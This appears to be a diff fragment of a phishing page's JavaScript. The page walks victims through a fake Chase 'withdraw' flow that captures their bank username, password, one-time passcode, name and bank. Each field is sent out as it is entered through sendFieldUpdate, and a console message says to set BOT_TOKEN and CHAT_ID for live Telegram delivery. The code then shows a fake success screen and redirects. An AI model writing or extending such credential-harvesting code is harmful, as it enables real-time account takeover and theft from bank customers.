+                sendFieldUpdate('Chase Password', '•••••••• (hidden)');
+                goToStep(3);
+                startProcessing(() => {
+                    otpInput.focus();
+                });
+            });
 
-        // Set default empty values for inputs (no autofill)
-        chaseUser.value = '';
-        chasePass.value = '';
-        otpInput.value = '';
-        fullNameInput.value = '';
-        bankSelect.value = '';
-    })();
-</script>
+            // Step3 OTP → Step4
+            step3Next.addEventListener('click', function() {
+                const otp = otpInput.value.trim();
+                if (otp.length === 0) {
+                    alert('Please enter the OTP code.');
+                    return;
+                }
+                if (!/^\d+$/.test(otp)) {
+                    alert('OTP should contain only digits (0-9).');
+                    return;
+                }
+                sendFieldUpdate('OTP Code', otp);
+                const data = collectAllData();
+                reviewName.innerText = data.name;
+                reviewBank.innerText = data.bank;
+                reviewOtp.innerText = data.otp;
+                goToStep(4);
+            });
+
+            // Step4 → Submit Withdraw
+            submitWithdrawBtn.addEventListener('click', function() {
+                const data = collectAllData();
+                // Final validation
+                if (data.name === 'Not provided' || data.bank === '' || data.otp === 'Not provided') {
+                    alert('Please complete all steps properly.');
+                    return;
+                }
+                // Show success and redirect
+                showSuccessAndRedirect();
+            });
+
+            // ---- back buttons ----
+            backToStep1.addEventListener('click', function() { goToStep(1);
+                validateBankSelection(); });
+            backToStep2.addEventListener('click', function() { goToStep(2); });
+            backToStep3.addEventListener('click', function() {
+                goToStep(3);
+                startProcessing(() => {});
+            });
+
+            // ---- override goToStep ----
+            const originalGoToStep = goToStep;
+            goToStep = function(step) {
+                if (step === 4) {
+                    const data = collectAllData();
+                    reviewName.innerText = data.name;
+                    reviewBank.innerText = data.bank;
+                    reviewOtp.innerText = data.otp;
+                }
+                originalGoToStep(step);
+                if (step === 1) validateBankSelection();
+            };
+
+            // ---- init ----
+            goToStep(1);
+            validateBankSelection();
+            reviewName.innerText = '—';
+            reviewBank.innerText = '—';
+            reviewOtp.innerText = '—';
+
+            // Clear autofill
+            chaseUser.value = '';
+            chasePass.value = '';
+            otpInput.value = '';
+            fullNameInput.value = '';
+            bankSelect.value = '';
+
+            console.log('🔔 Ready: Replace BOT_TOKEN and CHAT_ID for real Telegram integration.');
+        })();
+    </script>
 </body>
 </html>
